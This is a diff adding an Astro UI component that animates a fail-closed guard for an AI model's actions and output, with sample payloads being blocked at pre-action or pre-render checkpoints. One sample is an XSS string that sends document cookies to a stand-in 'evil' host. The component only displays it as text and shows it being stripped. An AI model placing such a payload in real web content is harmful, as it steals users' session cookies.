@@ -1,0 +1,287 @@
+---
+import { Icon } from 'astro-icon/components'
+import DiagramLabel from './DiagramLabel.astro'
+
+// The fail-closed membrane, made runnable. Pick what the model is trying to do
+// or say; the guard runs it through two checkpoints, pre-action then pre-render,
+// and either lets it through or stops it. The default is no: when a check can't
+// pass, nothing acts and nothing renders, and the turn degrades to a safe
+// message. Sibling of ValidatorPipeline, but for the guard's two gates.
+//
+// blockAt indexes the checkpoint that stops the payload: 0 = pre-action,
+// 1 = pre-render, -1 = clears both and ships.
+
+const checkpoints = [
+  {
+    key: 'action',
+    label: 'Pre-action',
+    icon: 'material-symbols:gavel',
+    checks: 'scope · confirmation · idempotency',
+  },
+  {
+    key: 'render',
+    label: 'Pre-render',
+    icon: 'material-symbols:visibility-outline',
+    checks: 'secrets · other-customer data · unsafe markup',
+  },
+]
+
+const payloads = [
+  {
+    key: 'clean',
+    label: 'Clean reply',
+    text: '“Your bill this month is $40.”',
+    blockAt: -1,
+    verdict: 'Both checkpoints clear. The reply renders.',
+  },
+  {
+    key: 'otherbill',
+    label: 'Another customer’s bill',
+    text: '“Customer 5012’s balance is $73.”',
+    blockAt: 1,
+    verdict: 'Fail-closed at pre-render: other-customer data. Degrades to a safe message.',
+  },
+  {
+    key: 'xss',
+    label: 'XSS markup',
+    text: '<img src=x onerror="fetch(\'//evil/?c=\'+document.cookie)">',
+    blockAt: 1,
+    verdict: 'Fail-closed at pre-render: unsafe markup stripped before it reaches the browser.',
+  },
+  {
+    key: 'unconfirmed',
+    label: 'Unconfirmed write',
+    text: 'change_plan(Plan B), no typed yes',
+    blockAt: 0,
+    verdict: 'Fail-closed at pre-action: confirmation was never given. Nothing commits.',
+  },
+  {
+    key: 'scope',
+    label: 'Out-of-scope id',
+    text: 'read_account(customer 999)',
+    blockAt: 0,
+    verdict: 'Fail-closed at pre-action: that id is not this session’s customer.',
+  },
+]
+const data = JSON.stringify(Object.fromEntries(payloads.map((p) => [p.key, p])))
+const initial = payloads[0]
+---
+
+<div
+  class="not-prose my-10 border border-border-dark bg-surface rounded-lg overflow-hidden"
+  data-gg
+  data-payloads={data}
+>
+  <div class="flex items-center justify-between gap-4 px-5 py-3 bg-surface-container-high border-b border-border-dark flex-wrap">
+    <DiagramLabel icon="material-symbols:shield-outline" label="Fail-closed guard" />
+    <span class="font-mono text-mono-xs text-text-muted uppercase tracking-wider">default is no</span>
+  </div>
+
+  <div class="p-5">
+    {/* payload picker */}
+    <div class="flex flex-wrap gap-1.5 mb-5" role="group" aria-label="Choose what the model is trying to do or say">
+      {
+        payloads.map((p, i) => (
+          <button
+            type="button"
+            data-gg-payload={p.key}
+            class:list={['gg-tab', i === 0 && 'gg-tab-on']}
+            aria-pressed={i === 0 ? 'true' : 'false'}
+          >
+            {p.label}
+          </button>
+        ))
+      }
+    </div>
+
+    <div class="mb-5 font-mono text-mono-xs">
+      <span class="text-text-muted uppercase tracking-wider">Model output</span>
+      <code class="block mt-1 px-3 py-2 bg-code-bg border border-border-dark text-on-surface-variant overflow-x-auto" data-gg-text>
+        {initial.text}
+      </code>
+    </div>
+
+    {/* two checkpoints + exit */}
+    <div class="flex gap-2 items-stretch overflow-x-auto">
+      {
+        checkpoints.map((c) => (
+          <div
+            class="gg-gate flex flex-1 min-w-[7rem] flex-col items-center justify-center gap-1 text-center px-3 py-3 border border-border-dark bg-surface-container-low"
+            data-gg-gate={c.key}
+          >
+            <Icon name={c.icon} class="gg-gate-icon text-text-muted text-[20px]" />
+            <span class="font-mono text-mono-xs text-text-primary uppercase tracking-wider leading-tight">{c.label}</span>
+            <span class="font-mono text-mono-xs text-text-muted leading-tight">{c.checks}</span>
+            <span class="gg-gate-mark font-mono text-sm" aria-hidden="true"></span>
+          </div>
+        ))
+      }
+      <div class="gg-exit flex flex-1 min-w-[6rem] flex-col items-center justify-center gap-1 text-center px-3 py-3 border border-dashed border-border-dark" data-gg-exit>
+        <Icon name="material-symbols:send-outline" class="text-text-muted text-[20px]" />
+        <span class="font-mono text-mono-xs text-text-muted uppercase tracking-wider leading-tight">Acts / renders</span>
+      </div>
+    </div>
+
+    <p
+      class="gg-status m-0 mt-4 flex items-center gap-2 px-3 py-2 border font-mono text-mono-xs border-border-dark text-text-muted"
+      data-gg-status
+      aria-live="polite"
+    >
+      <span data-gg-status-text>{initial.verdict}</span>
+    </p>
+  </div>
+</div>
+
+<style is:global>
+  [data-gg] .gg-tab {
+    display: inline-flex;
+    align-items: center;
+    min-height: 2.75rem;
+    font-family: var(--font-mono);
+    font-size: 0.75rem;
+    color: var(--color-text-muted);
+    padding: 0.2rem 0.8rem;
+    border: 1px solid var(--color-border-dark);
+    border-radius: var(--radius);
+    transition: all 0.2s ease;
+  }
+  [data-gg] .gg-tab-on {
+    background: var(--color-primary);
+    color: var(--color-on-primary);
+    border-color: var(--color-primary);
+  }
+  [data-gg] .gg-tab:focus-visible {
+    outline: 2px solid var(--color-primary);
+    outline-offset: 2px;
+  }
+  [data-gg] .gg-gate {
+    transition: border-color 0.25s ease, background-color 0.25s ease;
+  }
+  [data-gg] .gg-gate.pass {
+    border-color: color-mix(in srgb, var(--color-success) 50%, transparent);
+    background-color: color-mix(in srgb, var(--color-success) 8%, transparent);
+  }
+  [data-gg] .gg-gate.pass .gg-gate-icon,
+  [data-gg] .gg-gate.pass .gg-gate-mark {
+    color: var(--color-success);
+  }
+  [data-gg] .gg-gate.block {
+    border-color: var(--color-error);
+    background-color: color-mix(in srgb, var(--color-error) 10%, transparent);
+  }
+  [data-gg] .gg-gate.block .gg-gate-icon,
+  [data-gg] .gg-gate.block .gg-gate-mark {
+    color: var(--color-error);
+  }
+  @media (prefers-reduced-motion: no-preference) {
+    [data-gg] .gg-gate.block {
+      animation: ggShake 0.4s ease;
+    }
+  }
+  @keyframes ggShake {
+    0%, 100% { transform: translateX(0); }
+    25% { transform: translateX(-3px); }
+    75% { transform: translateX(3px); }
+  }
+  [data-gg] .gg-exit.ship {
+    border-style: solid;
+    border-color: color-mix(in srgb, var(--color-success) 50%, transparent);
+    background-color: color-mix(in srgb, var(--color-success) 8%, transparent);
+  }
+  [data-gg] .gg-exit.ship svg,
+  [data-gg] .gg-exit.ship span {
+    color: var(--color-success);
+  }
+  [data-gg] .gg-status.ok {
+    border-color: color-mix(in srgb, var(--color-success) 50%, transparent);
+    color: var(--color-text-primary);
+  }
+  [data-gg] .gg-status.stop {
+    border-color: var(--color-error);
+    color: var(--color-text-primary);
+  }
+</style>
+
+<script>
+  type Payload = { text: string; blockAt: number; verdict: string }
+  const root = document.querySelector<HTMLElement>('[data-gg]')
+  if (root) {
+    const payloads: Record<string, Payload> = JSON.parse(root.dataset.payloads || '{}')
+    const tabs = [...root.querySelectorAll<HTMLButtonElement>('[data-gg-payload]')]
+    const gates = [...root.querySelectorAll<HTMLElement>('[data-gg-gate]')]
+    const exit = root.querySelector<HTMLElement>('[data-gg-exit]')!
+    const text = root.querySelector<HTMLElement>('[data-gg-text]')!
+    const status = root.querySelector<HTMLElement>('[data-gg-status]')!
+    const statusText = root.querySelector<HTMLElement>('[data-gg-status-text]')!
+    const reduce = matchMedia('(prefers-reduced-motion: reduce)').matches
+    let token = 0
+
+    const clear = () => {
+      gates.forEach((g) => {
+        g.classList.remove('pass', 'block')
+        g.querySelector('.gg-gate-mark')!.textContent = ''
+      })
+      exit.classList.remove('ship')
+      status.classList.remove('ok', 'stop')
+    }
+
+    const run = (key: string) => {
+      const p = payloads[key]
+      if (!p) return
+      const myToken = ++token
+      clear()
+      text.textContent = p.text
+      const stepMs = reduce ? 0 : 300
+
+      gates.forEach((g, i) => {
+        window.setTimeout(() => {
+          if (myToken !== token) return
+          if (i === p.blockAt) {
+            g.classList.add('block')
+            g.querySelector('.gg-gate-mark')!.textContent = '✗'
+            status.classList.add('stop')
+            statusText.textContent = p.verdict
+          } else if (p.blockAt === -1 || i < p.blockAt) {
+            g.classList.add('pass')
+            g.querySelector('.gg-gate-mark')!.textContent = '✓'
+          }
+        }, stepMs * (i + 1))
+      })
+
+      if (p.blockAt === -1) {
+        window.setTimeout(() => {
+          if (myToken !== token) return
+          exit.classList.add('ship')
+          status.classList.add('ok')
+          statusText.textContent = p.verdict
+        }, stepMs * (gates.length + 1))
+      }
+    }
+
+    tabs.forEach((tab) =>
+      tab.addEventListener('click', () => {
+        tabs.forEach((t) => {
+          t.classList.remove('gg-tab-on')
+          t.setAttribute('aria-pressed', 'false')
+        })
+        tab.classList.add('gg-tab-on')
+        tab.setAttribute('aria-pressed', 'true')
+        run(tab.dataset.ggPayload!)
+      }),
+    )
+
+    // auto-run a blocked case once in view, so the fail-closed default reads at a glance
+    const io = new IntersectionObserver(
+      (entries, obs) => {
+        for (const e of entries) {
+          if (e.isIntersecting) {
+            obs.disconnect()
+            tabs.find((t) => t.dataset.ggPayload === 'otherbill')?.click()
+          }
+        }
+      },
+      { threshold: 0.4 },
+    )
+    io.observe(root)
+  }
+</script>
